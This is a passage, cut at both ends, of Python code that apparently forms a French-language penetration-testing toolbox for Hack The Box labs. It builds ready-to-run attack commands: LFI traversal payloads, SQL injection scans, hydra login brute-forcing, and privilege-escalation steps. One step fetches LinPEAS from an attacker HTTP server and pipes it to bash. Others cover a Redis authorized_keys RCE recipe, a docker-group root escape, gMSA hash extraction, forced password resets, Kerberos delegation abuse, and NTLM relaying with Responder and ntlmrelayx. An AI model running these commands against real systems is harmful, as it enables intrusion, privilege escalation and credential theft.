            f"  else echo '[!] droopescan manquant — pip3 install droopescan'; fi; "
            f"elif grep -qiE 'Joomla' {qout}/attack_checks/cms_detect.txt 2>/dev/null; then "
            f"  echo '[+] Joomla détecté → joomscan'; "
            f"  if command -v joomscan >/dev/null; then "
            f"    joomscan -u {qweb_url} 2>&1 | head -80; "
            f"  else echo '[!] joomscan manquant — apt install joomscan'; fi; "
            f"else echo '[!] CMS non reconnu — vérifier tech_detect et lancer manuellement'; fi"
        ] if t else None,

        "lfi_probe": ["bash","-c",
            f"command -v ffuf >/dev/null || {{ echo 'ffuf manquant — apt install ffuf'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            f"WLIST=/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt; "
            f"[ -f $WLIST ] || WLIST=/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt; "
            f"[ -f $WLIST ] || {{ echo 'Wordlist LFI manquante (SecLists requis)'; exit 1; }}; "
            f"echo '=== LFI : test paramètres courants ==='; "
            f"for PARAM in file page path include load template document view; do "
            f"  echo \"--- Test param: $PARAM ---\"; "
            f"  ffuf -w $WLIST -u {shell_quote(web_url + '/?FUZZ_PARAM=FUZZ')} "
            f"  -request-proto http -mc 200 -c -t 30 -fl 0 "
            f"  -H {shell_quote(f'Host: {t}')} 2>/dev/null | grep -v 'Status: 404' | head -10; "
            f"done 2>&1 | tee {qout}/attack_checks/lfi_probe.txt | head -100; "
            f"echo ''; echo '--- Payload direct (tester manuellement) ---'; "
            f"echo \"{web_url}/?file=../../../../etc/passwd\"; "
            f"echo \"{web_url}/?page=....//....//....//etc/passwd\"; "
            f"echo \"{web_url}/?path=php://filter/convert.base64-encode/resource=/etc/passwd\""
        ] if t else None,

        "sqlmap_basic": ["bash","-c",
            f"command -v sqlmap >/dev/null || {{ echo 'sqlmap manquant — apt install sqlmap'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            f"echo '[*] sqlmap sur {web_url} — scan non-intrusif (level 2, risk 1)'; "
            f"sqlmap -u {shell_quote(web_url + '/?id=1')} --batch --level 2 --risk 1 "
            f"--output-dir={qout}/attack_checks/sqlmap_basic --dbms=mysql,mssql,postgresql "
            f"--technique=BEUSTQ --timeout=10 2>&1 | tee {qout}/attack_checks/sqlmap_basic.txt | head -100; "
            f"echo ''; echo '--- Si formulaire POST, utiliser sqlmap_crawl ou préciser -u avec les params ---'"
        ] if t else None,

        "web_login_brute": ["bash","-c",
            f"command -v hydra >/dev/null || {{ echo 'hydra manquant — apt install hydra'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            f"WLIST=/usr/share/wordlists/rockyou.txt; "
            f"[ -f $WLIST ] || {{ echo 'rockyou.txt manquant'; exit 1; }}; "
            f"echo '=== Tentatives rapides (admin/admin, admin/password, admin/123456) ==='; "
            f"for cred in 'admin:admin' 'admin:password' 'admin:123456' 'admin:administrator' 'root:root' 'test:test'; do "
            f"  U=$(echo $cred | cut -d: -f1); P=$(echo $cred | cut -d: -f2); "
            f"  CODE=$(curl -sk -o /dev/null -w '%{{http_code}}' -X POST {shell_quote(web_url + '/login')} "
            f"  -d \"username=$U&password=$P\" -c /tmp/htb_cookie_test.txt 2>/dev/null); "
            f"  echo \"  $cred → HTTP $CODE\"; "
            f"done; "
            f"echo ''; echo '=== hydra HTTP POST bruteforce (admin + rockyou.txt) ==='; "
            f"echo '[!] Adapte le chemin /login et les paramètres form selon la cible'; "
            f"hydra -l {qu if u else 'admin'} -P <(head -500 $WLIST) "
            f"{qt} http-post-form "
            f"'/login:username=^USER^&password=^PASS^:Invalid' "
            f"-t 10 -f 2>&1 | tee {qout}/attack_checks/web_login_brute.txt | head -50"
        ] if t else None,

        # ── Linux PrivEsc ─────────────────────────────────────────────────
        "sudo_enum": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== sudo -l (via SSH) ==='; "
            f"{ssh_run('sudo -l 2>&1; echo; echo === id ===; id; echo === groups ===; groups; echo === /etc/passwd tail ===; tail -5 /etc/passwd 2>/dev/null', f'{out}/attack_checks/sudo_enum.txt')}; "
            f"echo ''; echo '--- GTFOBins sudo : https://gtfobins.github.io/#+sudo ---'"
        ] if t else None,

        "suid_sgid_find": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== SUID binaries ==='; "
            + ssh_run('find / -perm -4000 -type f 2>/dev/null | sort; echo "=== SGID binaries ==="; find / -perm -2000 -type f 2>/dev/null | sort', out+'/attack_checks/suid_sgid.txt') + "; "
            f"echo ''; echo '--- GTFOBins SUID : https://gtfobins.github.io/#+suid ---'; "
            f"echo '--- GTFOBins SGID : https://gtfobins.github.io/#+sgid ---'"
        ] if t else None,

        "linux_caps_check": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== Linux Capabilities (getcap -r /) ==='; "
            + ssh_run('getcap -r / 2>/dev/null; echo ""; echo "=== writable /etc/passwd check ==="; ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null', out+'/attack_checks/caps.txt') + "; "
            f"echo ''; echo '--- cap_setuid → exec Python/Perl/Node : python3 -c import os; os.setuid(0); os.system(\"/bin/bash\") ---'; "
            f"echo '--- GTFOBins capabilities : https://gtfobins.github.io/#+capabilities ---'"
        ] if t else None,

        "linux_cron_check": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== Crontabs système ==='; "
            + ssh_run('cat /etc/crontab 2>/dev/null; echo "=== /etc/cron.d ==="; ls -la /etc/cron.d/ 2>/dev/null; cat /etc/cron.d/* 2>/dev/null; echo "=== crontab user ==="; crontab -l 2>/dev/null; echo "=== world-writable scripts in cron ==="; for f in $(grep -oE "[^ ]+\\.sh" /etc/crontab /etc/cron.d/* 2>/dev/null); do [ -w "$f" ] && echo "WRITABLE: $f"; done', out+'/attack_checks/cron_check.txt') + "; "
            f"echo ''; echo '--- Un script world-writable appelé par root en cron = PrivEsc direct ---'"
        ] if t else None,

        "linux_services_enum": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== Ports en écoute locaux ==='; "
            + ssh_run('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null; echo "=== Processus root ==="; ps aux | grep root | grep -v grep | head -20; echo "=== Services systemd actifs ==="; systemctl list-units --type=service --state=running 2>/dev/null | head -30; echo "=== Env PATH ==="; echo $PATH', out+'/attack_checks/services_enum.txt') + "; "
            f"echo ''; echo '--- Ports locaux non exposés = services internes potentiellement exploitables ---'"
        ] if t else None,

        "linux_privesc_check": ["bash","-c",
            f"mkdir -p {qout}/attack_checks /tmp/htbtoolbox_serve; "
            f"LINPEAS=/tmp/htbtoolbox_serve/linpeas.sh; "
            f"if [ ! -f $LINPEAS ]; then "
            f"  echo '[*] Téléchargement LinPEAS...'; "
            f"  curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh "
            f"  -o $LINPEAS 2>&1 || {{ echo '[!] Download échoué — vérifie la connexion internet'; exit 1; }}; "
            f"  chmod +x $LINPEAS; echo '[+] linpeas.sh téléchargé'; "
            f"fi; "
            f"LHOST=$(ip route get {qt} 2>/dev/null | grep -oP 'src \\K\\S+' | head -1); "
            f"LHOST=${{LHOST:-ATTACKER_IP}}; "
            f"fuser 9999/tcp >/dev/null 2>&1 || (cd /tmp/htbtoolbox_serve && python3 -m http.server 9999 >/dev/null 2>&1 &); "
            f"sleep 1; echo \"[+] Serveur HTTP → http://$LHOST:9999\"; "
            f"echo \"[*] Commande à exécuter sur la cible : curl -s http://$LHOST:9999/linpeas.sh | bash\"; "
            f"echo ''; "
            + (f"echo '=== Exécution LinPEAS via SSH ==='; "
               f"{ssh_run('curl -s http://$LHOST:9999/linpeas.sh | bash 2>&1 | tee /tmp/linpeas_out.txt; tail -200 /tmp/linpeas_out.txt', f'{out}/attack_checks/linpeas_output.txt')}"
               if u else
               f"echo '[!] Pas de credentials SSH — copier la commande curl ci-dessus et exécuter sur le foothold'")
        ] if t else None,

        "pspy_monitor": ["bash","-c",
            f"mkdir -p {qout}/attack_checks /tmp/htbtoolbox_serve; "
            f"PSPY=/tmp/htbtoolbox_serve/pspy64; "
            f"if [ ! -f $PSPY ]; then "
            f"  echo '[*] Téléchargement pspy64...'; "
            f"  curl -fsSL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 "
            f"  -o $PSPY 2>&1 || {{ echo '[!] Download échoué'; exit 1; }}; "
            f"  chmod +x $PSPY; echo '[+] pspy64 téléchargé'; "
            f"fi; "
            f"LHOST=$(ip route get {qt} 2>/dev/null | grep -oP 'src \\K\\S+' | head -1); "
            f"LHOST=${{LHOST:-ATTACKER_IP}}; "
            f"fuser 9999/tcp >/dev/null 2>&1 || (cd /tmp/htbtoolbox_serve && python3 -m http.server 9999 >/dev/null 2>&1 &); "
            f"sleep 1; echo \"[+] Serveur HTTP → http://$LHOST:9999\"; "
            f"echo \"[*] Commandes à exécuter sur la cible :\"; "
            f"echo \"  wget http://$LHOST:9999/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64 && /tmp/pspy64\"; "
            f"echo \"  ou : curl -s http://$LHOST:9999/pspy64 -o /tmp/pspy64 && chmod +x /tmp/pspy64 && /tmp/pspy64\"; "
            f"echo ''; echo '[*] pspy surveille les processus sans root — attend 2-3 min pour voir les cronjobs'; "
            f"echo '[*] Cherche : UID=0, EUID=0 — commandes avec mots de passe en clair, scripts modifiables'"
        ] if t else None,

        "linux_docker_check": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== Docker group + containers ==='; "
            + ssh_run('id; echo; echo "=== Docker group ==="; groups | grep -o docker || echo "NON dans le groupe docker"; echo; echo "=== Docker info (si accessible) ==="; docker ps 2>&1 | head -10; echo; echo "=== Images dispo ==="; docker images 2>&1 | head -10; echo; echo "=== Container escape (si dans group docker) ==="; echo "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"', out+'/attack_checks/docker_check.txt') + "; "
            f"echo ''; echo '--- Si dans groupe docker : docker run -v /:/mnt --rm -it alpine chroot /mnt sh = root ---'"
        ] if t else None,

        # ── SQL / Databases ──────────────────────────────────────────────
        "mysql_probe": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== MySQL nmap NSE ==='; "
            f"nmap -Pn -p 3306 --script mysql-info,mysql-empty-password,mysql-databases,mysql-variables {qt} 2>&1 "
            f"| tee {qout}/attack_checks/mysql_probe.txt; "
            + (f"echo ''; echo '=== MySQL auth (credentials) ==='; "
               f"if command -v mysql >/dev/null; then "
               f"  mysql -h {qt} -u {qu} -p{qp} -e 'SHOW DATABASES; SELECT user,host,plugin FROM mysql.user 2>/dev/null;' 2>&1 "
               f"  | tee -a {qout}/attack_checks/mysql_probe.txt; "
               f"fi"
               if u else
               f"echo ''; echo '=== MySQL anonymous ==='; "
               f"if command -v mysql >/dev/null; then "
               f"  mysql -h {qt} -u root --password= -e 'SHOW DATABASES;' 2>&1 | head -20; "
               f"  mysql -h {qt} -u '' --password= -e 'SHOW DATABASES;' 2>&1 | head -20; "
               f"fi; "
               f"echo '--- FILE priv : SELECT LOAD_FILE(\"/etc/passwd\") ---'")
        ] if t else None,

        "mssql_probe": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== MSSQL nmap ==='; "
            f"nmap -Pn -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password {qt} 2>&1 "
            f"| tee {qout}/attack_checks/mssql_probe.txt; "
            f"echo ''; echo '=== nxc mssql ==='; "
            f"{shell_quote(nxc)} mssql {qt} "
            + (f"-u {qu} " + (f"-H {qnt}" if nt else f"-p {qp}") + f" -d {qd} --get-nt-hash 2>&1" if u else "-u '' -p '' 2>&1")
            + f" | tee -a {qout}/attack_checks/mssql_probe.txt; "
            f"echo ''; echo '--- xp_cmdshell : nxc mssql {t} -u user -p pass --exec \"whoami\" ---'; "
            f"echo '--- impacket : impacket-mssqlclient DOMAIN/user:pass@{t} ---'"
        ] if t else None,

        "postgres_probe": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== PostgreSQL nmap ==='; "
            f"nmap -Pn -p 5432 --script pgsql-brute {qt} 2>&1 | tee {qout}/attack_checks/postgres_probe.txt; "
            + (f"echo ''; echo '=== psql auth ==='; "
               f"if command -v psql >/dev/null; then "
               f"  PGPASSWORD={qp} psql -h {qt} -U {qu} -c '\\l' 2>&1 | head -30 "
               f"  | tee -a {qout}/attack_checks/postgres_probe.txt; "
               f"  echo '--- COPY for file read : COPY t FROM /etc/passwd ---'; "
               f"fi"
               if u else
               f"echo ''; echo '=== psql anonymous (postgres:postgres) ==='; "
               f"if command -v psql >/dev/null; then "
               f"  PGPASSWORD=postgres psql -h {qt} -U postgres -c '\\l' 2>&1 | head -20; "
               f"  PGPASSWORD='' psql -h {qt} -U postgres -c '\\l' 2>&1 | head -20; "
               f"fi")
        ] if t else None,

        "redis_probe": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== Redis unauth probe ==='; "
            f"if command -v redis-cli >/dev/null; then "
            f"  redis-cli -h {qt} -p 6379 PING 2>&1 | tee {qout}/attack_checks/redis_probe.txt; "
            f"  redis-cli -h {qt} -p 6379 INFO server 2>&1 | head -20 | tee -a {qout}/attack_checks/redis_probe.txt; "
            f"  redis-cli -h {qt} -p 6379 CONFIG GET dir 2>&1 | tee -a {qout}/attack_checks/redis_probe.txt; "
            f"  redis-cli -h {qt} -p 6379 CONFIG GET dbfilename 2>&1 | tee -a {qout}/attack_checks/redis_probe.txt; "
            f"  redis-cli -h {qt} -p 6379 KEYS '*' 2>&1 | head -20 | tee -a {qout}/attack_checks/redis_probe.txt; "
            f"else "
            f"  nmap -Pn -p 6379 --script redis-info {qt} 2>&1 | tee {qout}/attack_checks/redis_probe.txt; "
            f"fi; "
            f"echo ''; echo '--- RCE via authorized_keys : CONFIG SET dir /root/.ssh && CONFIG SET dbfilename authorized_keys && SET x \"\\n\\nssh-rsa AAAA...\\n\\n\" && BGSAVE ---'"
        ] if t else None,

        "mongodb_probe": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== MongoDB nmap ==='; "
            f"nmap -Pn -p 27017,27018,27019 --script mongodb-info,mongodb-databases {qt} 2>&1 "
            f"| tee {qout}/attack_checks/mongodb_probe.txt; "
            f"echo ''; echo '=== mongosh anonymous ==='; "
            f"if command -v mongosh >/dev/null; then "
            f"  timeout 8 mongosh --host {qt} --quiet --eval 'db.adminCommand({{listDatabases:1}})' 2>&1 "
            f"  | head -30 | tee -a {qout}/attack_checks/mongodb_probe.txt; "
            f"elif command -v mongo >/dev/null; then "
            f"  timeout 8 mongo --host {qt} --quiet --eval 'db.adminCommand({{listDatabases:1}})' 2>&1 "
            f"  | head -30 | tee -a {qout}/attack_checks/mongodb_probe.txt; "
            f"else echo '[!] mongosh/mongo non installé — apt install mongodb-clients'; fi; "
            f"echo '--- Lire collection : use admin; db.getCollectionNames(); db.system.users.find() ---'"
        ] if t else None,

        "sqlmap_crawl": ["bash","-c",
            f"command -v sqlmap >/dev/null || {{ echo 'sqlmap manquant — apt install sqlmap'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            f"echo '[*] sqlmap crawl sur {web_url} (peut prendre plusieurs minutes)...'; "
            f"sqlmap -u {qweb_url} --batch --crawl=3 --level 3 --risk 2 "
            f"--output-dir={qout}/attack_checks/sqlmap_crawl --forms "
            f"--technique=BEUSTQ --timeout=15 --threads=3 2>&1 "
            f"| tee {qout}/attack_checks/sqlmap_crawl.txt | head -200"
        ] if t else None,

        # ── Recon ────────────────────────────────────────────────────────
        "adfs_probe": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== HTTP redirect (ADFS detect) ==='; "
            f"curl -skI --max-time 8 {shell_quote(f'http://{t}')} 2>&1 | grep -iE 'location|server|x-powered'; "
            f"echo ''; echo '=== ADFS /adfs/ls/ ==='; "
            f"curl -skI --max-time 8 {shell_quote(f'https://{t}/adfs/ls/')} 2>&1 | head -15; "
            f"echo ''; echo '=== ADFS WS-Trust endpoints ==='; "
            f"curl -sk --max-time 8 {shell_quote(f'https://{t}/adfs/services/trust/2005/windowstransport')} 2>&1 | head -5; "
            f"curl -sk --max-time 8 {shell_quote(f'https://{t}/adfs/services/trust/13/usernamemixed')} 2>&1 | head -5; "
            f"echo ''; echo '=== ADFS ROPC (OAuth2) ==='; "
            f"curl -sk --max-time 8 {shell_quote(f'https://{t}/adfs/oauth2/token')} 2>&1 | head -5; "
            f"echo ''; echo '=== DNS : cherche adfs.{d if d else t} ==='; "
            f"(command -v nslookup >/dev/null && nslookup {shell_quote(f'adfs.{d if d else t}')} {qt}) 2>&1 | head -10; "
            f"(command -v nslookup >/dev/null && nslookup {shell_quote(f'sts.{d if d else t}')} {qt}) 2>&1 | head -10 "
            f"| tee {qout}/attack_checks/adfs_probe.txt"
        ] if t else None,

        # ── LDAP enriched ────────────────────────────────────────────────
        "ldap_constrained_deleg": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== Comptes avec délégation contrainte (msDS-AllowedToDelegateTo) ==='; "
            f"ldapsearch -x -H {shell_quote(f'ldap://{t}')} {ldap_bind()} -b {qdn} "
            f"'(&(objectClass=user)(msDS-AllowedToDelegateTo=*))' "
            f"sAMAccountName msDS-AllowedToDelegateTo userAccountControl 2>&1 "
            f"| tee {qout}/attack_checks/constrained_deleg.txt; "
            f"echo ''; echo '=== Machines avec délégation contrainte ==='; "
            f"ldapsearch -x -H {shell_quote(f'ldap://{t}')} {ldap_bind()} -b {qdn} "
            f"'(&(objectClass=computer)(msDS-AllowedToDelegateTo=*))' "
            f"sAMAccountName msDS-AllowedToDelegateTo 2>&1 | tee -a {qout}/attack_checks/constrained_deleg.txt; "
            f"echo ''; echo '=== Comptes avec délégation non-contrainte ==='; "
            f"ldapsearch -x -H {shell_quote(f'ldap://{t}')} {ldap_bind()} -b {qdn} "
            f"'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))' "
            f"sAMAccountName 2>&1 | tee -a {qout}/attack_checks/constrained_deleg.txt"
        ] if t and u and dn else None,

        "ldap_gmsa_readable": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== gMSA accounts (msDS-GroupManagedServiceAccount) ==='; "
            f"ldapsearch -x -H {shell_quote(f'ldap://{t}')} {ldap_bind()} -b {qdn} "
            f"'(objectClass=msDS-GroupManagedServiceAccount)' "
            f"sAMAccountName msDS-ManagedPasswordInterval msDS-GroupMSAMembership description 2>&1 "
            f"| tee {qout}/attack_checks/gmsa_accounts.txt; "
            f"echo ''; echo '=== Comptes de service (sAMAccountName terminant par $) ==='; "
            f"ldapsearch -x -H {shell_quote(f'ldap://{t}')} {ldap_bind()} -b {qdn} "
            f"'(&(objectClass=user)(sAMAccountName=*$))' sAMAccountName description memberOf 2>&1 "
            f"| tee -a {qout}/attack_checks/gmsa_accounts.txt; "
            f"echo ''; echo '--- Hint : si tu as un TGT → nxc ldap {t} --use-kcache --gmsa ---'"
        ] if t and u and dn else None,

        # ── Post-auth HTB specific ────────────────────────────────────────
        "pre2k_check": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; OUT={qout}/attack_checks/pre2k.txt; : > \"$OUT\"; "
            f"echo '=== pre2k detection — comptes machine pré-W2000 ===' | tee -a \"$OUT\"; "
            # 1) LDAP authentifié : recherche des computer accounts suspects (logonCount=0, pwdLastSet=0)
            + (f"echo '--- ldapsearch : computer accounts avec logonCount=0 et pwdLastSet=0 ---' | tee -a \"$OUT\"; "
               f"ldapsearch -x -LLL -H ldap://{qt} {ldap_bind()} -b {qdn} "
               f"'(&(objectCategory=computer)(logonCount=0)(pwdLastSet=0))' "
               f"sAMAccountName dNSHostName userAccountControl whenCreated 2>&1 "
               f"| tee -a \"$OUT\"; echo '' | tee -a \"$OUT\"; "
               if u else "")
            # 2) Outil pre2k si installé (mode authentifié si creds dispo, sinon unauth)
            + f"if command -v pre2k >/dev/null 2>&1; then "
            f"  echo '=== pre2k tool ===' | tee -a \"$OUT\"; "
            + (f"  pre2k auth -u {qu} -p {qp} -d {qd} -dc-ip {qt} 2>&1 | tee -a \"$OUT\"; "
               if u and p and not nt else
               f"  pre2k unauth -d {qd} -dc-ip {qt} 2>&1 | tee -a \"$OUT\"; ")
            + f"else "
            f"  echo '[*] Outil pre2k absent (pip install pre2k ou https://github.com/garrettfoster13/pre2k)' | tee -a \"$OUT\"; "
            f"fi; "
            f"echo '' | tee -a \"$OUT\"; "
            f"echo '--- Pattern : password = hostname en minuscules sans $ ---' | tee -a \"$OUT\"; "
            f"echo '--- Ex: MS01$ → mot de passe = ms01 ---' | tee -a \"$OUT\"; "
            f"echo '--- Exploit : impacket-getTGT {d}/MS01\\$:ms01 -dc-ip {t} ---' | tee -a \"$OUT\""
        ] if t and d else None,

        "gmsa_extract": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            + (f"echo '=== gMSA extraction avec kcache ==='; "
               f"KRB5CCNAME={qcc} {shell_quote(nxc)} ldap {qt} --use-kcache --gmsa 2>&1 "
               f"| tee {qout}/attack_checks/gmsa_extract.txt"
               if cc else
               f"echo '=== gMSA extraction avec credentials ==='; "
               f"{shell_quote(nxc)} ldap {qt} -u {qu} "
               + (f"-H {qnt}" if nt else f"-p {qp}")
               + f" -d {qd} --gmsa 2>&1 | tee {qout}/attack_checks/gmsa_extract.txt"
               if u else
               "echo 'Credentials ou ccache requis pour extraire les mots de passe gMSA'")
            + f"; echo ''; echo '--- Le NTLM hash extrait peut être utilisé avec -H pour nxc/evil-winrm ---'"
        ] if t else None,

        "forcechangepwd": ["bash","-c",
            f"BLOODY={shell_quote(get_bloodyad())}; "
            f"mkdir -p {qout}/attack_checks; "
            + (f"TARGET_ACCOUNT={qta}; " if ta else
               f"TARGET_ACCOUNT='TARGET_ACCOUNT'; "
               f"echo '[!] Remplis le champ target_account dans l UI (ex: a.white_adm) puis relance.'; ")
            + (f"NEW_PASS='HTBpwned2025!'; "
               f"echo \"=== ForceChangePassword via bloodyAD → $TARGET_ACCOUNT ===\"; "
               + (f"KRB5CCNAME={qcc} $BLOODY -k -d {qd} -u {qu} --host {qdc} "
                  f"set password \"$TARGET_ACCOUNT\" \"$NEW_PASS\""
                  if cc else
                  f"$BLOODY -d {qd} -u {qu} "
                  + (f"--hash {qnt}" if nt else f"-p {qp}")
                  + f" --host {qdc if dc else qt} --dc-ip {qt} "
                  f"set password \"$TARGET_ACCOUNT\" \"$NEW_PASS\"")
               + f" 2>&1 | tee {qout}/attack_checks/forcechangepwd.txt; "
               f"echo ''; echo '=== Alternative rpcclient ==='; "
               f"echo \"rpcclient -U '{d}\\\\{u}%{p or 'PASS'}' {t} -c \\\"setuserinfo2 $TARGET_ACCOUNT 23 $NEW_PASS\\\"\""
               if u else "echo 'Credentials requis pour ForceChangePassword'")
        ] if t and d else None,

        "getST_constrained": (lambda _dom=d or "domain": ["bash","-c",
            f"TOOL={shell_quote(get_impacket('getST'))}; "
            f"command -v $TOOL >/dev/null || {{ echo 'getST introuvable — vérifiez impacket'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            + (f"echo '=== S4U2Proxy Constrained Delegation ==='; "
               + (f"IMPERSONATE={qta}; " if ta else
                  "IMPERSONATE='Administrator'; "
                  "echo '[!] Aucun target_account défini — utilise Administrator (renseigne le champ target_account pour personnaliser)'; ")
               + f"SPN_TARGET='http/TARGET.{_dom}'; "
               f"echo '[!] Remplace SPN_TARGET par le SPN cible (ex: http/WEB01.{_dom})'; "
               + (f"KRB5CCNAME={qcc} $TOOL -spn \"$SPN_TARGET\" -impersonate \"$IMPERSONATE\" "
                  f"-k -no-pass -dc-ip {qt} {shell_quote(f'{d}/{u}')} 2>&1"
                  if cc else
                  f"$TOOL -spn \"$SPN_TARGET\" -impersonate \"$IMPERSONATE\" -dc-ip {qt} "
                  + (f"-hashes {shell_quote(':' + nt)} {shell_quote(f'{d}/{u}')}" if nt else
                     f"{shell_quote(f'{d}/{u}:{p}')}")
                  + f" 2>&1")
               + f" | tee {qout}/attack_checks/getST.txt; "
               f"echo ''; echo '--- Utilise le ccache genere : export KRB5CCNAME=$IMPERSONATE@http_...ccache ---'"
               if u else "echo 'Credentials requis pour getST'")
        ])() if t and d else None,

        "spnjacking_enum": ["bash","-c",
            f"BLOODY={shell_quote(get_bloodyad())}; "
            f"mkdir -p {qout}/attack_checks; "
            + (f"echo '=== WriteSPN via bloodyAD (writable detail) ==='; "
               f"$BLOODY -d {qd} -u {qu} "
               + (f"--hash {qnt}" if nt else f"-p {qp}")
               + f" --host {qdc if dc else qt} --dc-ip {qt} "
               f"get writable --detail 2>&1 | grep -A2 -iE 'WriteSPN|servicePrincipalName|SPN' "
               f"| tee {qout}/attack_checks/spnjacking.txt; "
               f"echo ''; echo '=== SPNs existants (tous les comptes) ==='; "
               f"ldapsearch -x -H {shell_quote(f'ldap://{t}')} {ldap_bind()} -b {qdn} "
               f"'(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName 2>&1 "
               f"| tee -a {qout}/attack_checks/spnjacking.txt; "
               f"echo ''; echo '--- SPN Jacking : WriteSPN → ajouter SPN → getST S4U2Self → usurper service ---'"
               if u else "echo 'Credentials requis'")
        ] if t and d else None,

        # ── Coercition NTLM ──────────────────────────────────────────────
        "responder_listen": ["bash","-c",
            f"command -v responder >/dev/null || command -v Responder >/dev/null || {{ echo 'Responder introuvable — apt install responder'; exit 1; }}; "
            f"RESP=$(command -v responder || command -v Responder); "
            f"IFACE=$(ip route get {qt} 2>/dev/null | grep -oP 'dev \\K\\S+' | head -1); "
            f"IFACE=${{IFACE:-eth0}}; "
            f"mkdir -p {qout}/attack_checks; "
            f"echo \"[*] Interface : $IFACE — écoute passive LLMNR/NBT-NS/mDNS\"; "
            f"echo '[*] Ctrl+C pour arrêter — les hashes capturés sont dans /usr/share/responder/logs/'; "
            f"if [ \"$(id -u)\" -eq 0 ]; then "
            f"  \"$RESP\" -I \"$IFACE\" -A 2>&1; "
            f"elif [ -n \"${{SUDO_PASS:-}}\" ]; then "
            f"  printf '%s\\n' \"$SUDO_PASS\" | sudo -S -p '' \"$RESP\" -I \"$IFACE\" -A 2>&1; "
            f"else "
            f"  sudo \"$RESP\" -I \"$IFACE\" -A 2>&1; "
            f"fi | tee {qout}/attack_checks/responder.txt"
        ] if t else None,

        "ntlmrelayx_relay": ["bash","-c",
            f"TOOL={shell_quote(get_impacket('ntlmrelayx'))}; "
            f"command -v $TOOL >/dev/null || {{ echo 'impacket-ntlmrelayx introuvable'; exit 1; }}; "
            f"TARGETS={qout}/smb_relay_targets.txt; "
            f"[ -f $TARGETS ] || echo '[!] smb_relay_targets.txt absent — using single target {t}'; "
            f"TARGET_ARGS=$([ -f $TARGETS ] && echo \"-tf $TARGETS\" || echo \"-t smb://{qt}\"); "
            f"echo '[*] Lance ntlmrelayx — désactive Responder SMB/HTTP avant ! (Responder.conf: SMB=Off, HTTP=Off)'; "
            f"if [ \"$(id -u)\" -eq 0 ]; then "
            f"  \"$TOOL\" $TARGET_ARGS -smb2support 2>&1; "
            f"elif [ -n \"${{SUDO_PASS:-}}\" ]; then "
            f"  printf '%s\\n' \"$SUDO_PASS\" | sudo -S -p '' \"$TOOL\" $TARGET_ARGS -smb2support 2>&1; "
            f"else "
            f"  sudo \"$TOOL\" $TARGET_ARGS -smb2support 2>&1; "
            f"fi | tee {qout}/attack_checks/ntlmrelayx_relay.txt"
        ] if t else None,

        "coercer_run": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"LHOST=$(ip route get {qt} 2>/dev/null | grep -oP 'src \\K\\S+' | head -1); "
            f"LHOST=${{LHOST:-127.0.0.1}}; "
            + (f"if command -v coercer >/dev/null; then "
               f"  coercer coerce -u {qu} "
               + (f"-H {qnt}" if nt else f"-p {qp}")
               + f" -d {qd} -l $LHOST -t {qt} --always-continue 2>&1 | tee {qout}/attack_checks/coercer.txt; "
               f"elif command -v {shell_quote(nxc)} >/dev/null; then "
               f"  echo '[*] Coercer absent, fallback sur nxc -M coerce_plus'; "
               f"  {shell_quote(nxc)} smb {qt} -u {qu} "
               + (f"-H {qnt}" if nt else f"-p {qp}")
               + f" -d {qd} -M coerce_plus -o LISTENER=$LHOST 2>&1 | tee {qout}/attack_checks/coercer.txt; "
               f"else "
               f"  echo 'Coercer et nxc introuvables'; exit 1; "
               f"fi"
               if u else "echo 'Credentials requis pour Coercer (authentification nécessaire)'")
        ] if t and d else None,

        # ── Tunneling / Pivot ────────────────────────────────────────────
        "ligolo_server": ["bash","-c",
            f"SUDO_PASS={shell_quote(sp)}; "
            f"command -v ligolo-proxy >/dev/null || {{ "
            f"echo '[!] ligolo-proxy introuvable'; "
            f"echo 'Install : wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz -O /tmp/ligolo.tar.gz'; "
            f"echo '         tar -xzf /tmp/ligolo.tar.gz -C /usr/local/bin/ && chmod +x /usr/local/bin/ligolo-proxy'; "
            f"exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== Setup interface TUN ligolo ==='; "
            f"if ip link show ligolo >/dev/null 2>&1; then "
            f"  echo '[*] Interface ligolo déjà existante'; "
            f"  if [ \"$(id -u)\" -eq 0 ]; then "
            f"    ip link set ligolo up 2>/dev/null || true; "
            f"  elif [ -n \"${{SUDO_PASS:-}}\" ]; then "
